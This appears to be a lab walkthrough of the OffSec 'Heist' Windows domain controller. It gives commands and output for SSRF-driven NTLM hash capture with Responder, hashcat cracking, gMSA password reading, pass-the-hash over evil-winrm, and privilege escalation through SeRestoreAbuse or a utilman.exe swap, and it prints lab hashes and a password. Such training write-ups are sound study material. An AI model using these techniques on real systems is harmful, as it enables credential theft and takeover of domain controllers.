## NMAP
```nmap
nmap -sC -sV -Pn -oA heist 192.168.55.165                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 23:34 CST
Nmap scan report for 192.168.55.165
Host is up (0.045s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-26 05:35:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-02-26T05:36:06+00:00; +5s from scanner time.
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2023-01-22T09:39:55
|_Not valid after:  2023-07-24T09:39:55
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-26T05:35:21+00:00
8080/tcp open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-26T05:35:22
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 2s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.87 seconds 
```

## Enumeration

While doing some testing, I was not able to find anything with enum4linux. I then started focusing on 8080 as that seems to be able to reach back to my server.

"In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials."

It seems that SSRF is not always successful in getting getting a shell; however, it can sometimes leak data.

## Exploitation

As this is a Windows machine, we setup responder and opened a web link to our server that was no longer hosting a python web server. This was to get it to fail

```sh
sudo responder -I tun0                      
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.49.55]
    Responder IPv6             [fe80::cc02:2b0c:8327:725d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-P6TBDOPK7IU]
    Responder Domain Name      [GV2G.LOCAL]
    Responder DCE-RPC Port     [47765]

[+] Listening for events...                                                                                         

[HTTP] NTLMv2 Client   : 192.168.55.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:cac546d35ac37c13:642561FC159C108A0AEAD755FFFD38F7:0101000000000000D66E2417AA49D90192951EA46AE8560D0000000002000800470056003200470001001E00570049004E002D00500036005400420044004F0050004B003700490055000400140047005600320047002E004C004F00430041004C0003003400570049004E002D00500036005400420044004F0050004B003700490055002E0047005600320047002E004C004F00430041004C000500140047005600320047002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350035000000000000000000             
[+] Exiting...
```

We have a hash!

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

It cracked!
```
cat cracked.txt 
ENOX::HEIST:cac546d35ac37c13:642561fc159c108a0aead755fffd38f7:0101000000000000d66e2417aa49d90192951ea46ae8560d0000000002000800470056003200470001001e00570049004e002d00500036005400420044004f0050004b003700490055000400140047005600320047002e004c004f00430041004c0003003400570049004e002d00500036005400420044004f0050004b003700490055002e0047005600320047002e004c004f00430041004c000500140047005600320047002e004c004f00430041004c000800300030000000000000000000000000300000c856f6898bee6992d132cc256ac1c2292f725d1c9cb0a2bb6f2ea6dd672384220a001000000000000000000000000000000000000900240048005400540050002f003100390032002e003100360038002e00340039002e00350035000000000000000000:california
```
ENOX:california

User appears to work with evil-winrm.

## User Enumeration

```
*Evil-WinRM* PS C:\Users\enox\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
*Evil-WinRM* PS C:\Users\enox\Desktop> more todo.txt
- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
- Debug Flask Application [DONE]
- Remove Flask Application
- Submit IT Expenses file to admin. [DONE]
```

The todo.txt mentions a managed service account. Looking this up, it appears we should be able to read this. According to bloodhound, the user is part of Webadmins which has ReadGMSAPassword. I was able to find the password reader below and run it.

https://github.com/rvazarkar/GMSAPasswordReader
https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe

```
C:\temp>                .\GMSAPasswordReader.exe --AccountName svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 56B46EFB124B4612500B0DBCFE917FBB
[*]       aes128_cts_hmac_sha1 : 9253CC2AE1E2E5ABB18BE593CD9CC11E
[*]       aes256_cts_hmac_sha1 : 439CAD3D3C349AF92704EE248D4D57C70CA5B7BE75A3144C8120FA366FB15BF7
[*]       des_cbc_md5          : 45A84A3458311061

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 2210EE26FFBF3180C711C16C82B9FB08
[*]       aes128_cts_hmac_sha1 : C2EB973B5CFF7FB477DDA0963B3CAF21
[*]       aes256_cts_hmac_sha1 : 1004B7B26458ED563D7BEC1B588A02CED6BBFD40A03B2C22219C54B1580C9629
[*]       des_cbc_md5          : CE89E558C1E36D61

```

We have access to the svc_apache user account with the RC4 which is esstentially NTLM.

I was able to use this on evil-winrm.

```sh
evil-winrm -i 192.168.155.165 -u svc_apache$ -H 2210EE26FFBF3180C711C16C82B9FB08

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami 
heist\svc_apache$
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

SeBackupPrivelege exists. 

https://github.com/gtworek/Priv2Admin

There is a bypass that can be done in two ways.

### Option 1 - DLL method using SeRestoreAbuse
```
We can verify if seclogon is able to be edited to change the service dll and gain root access using the bypass here:  https://github.com/xct/SeRestoreAbuse
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
cmd.exe /c sc qc seclogon
```
“security descriptors" will appear for the CMD query. Here is how to read them.
Each of the letters above are in groups of two’s, which means we can break down the descriptors as CC ; LC ; SW ; RP ; DT ; LO ; CR ; RC and then after the three semi-colons, we have the group AU
https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
```

### Option 2 - Utilman replace and rdp

The other way is to use the privileges to change utilman.exe to cmd.exe and get local administrator that way. as long as rdp can be launched without credential. 
**Most have this option disabled and the first option will work better**
```
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```
Went this route and opened remote desktop without credentials which allows me to click the utilman option.

I was able to get the proof this way.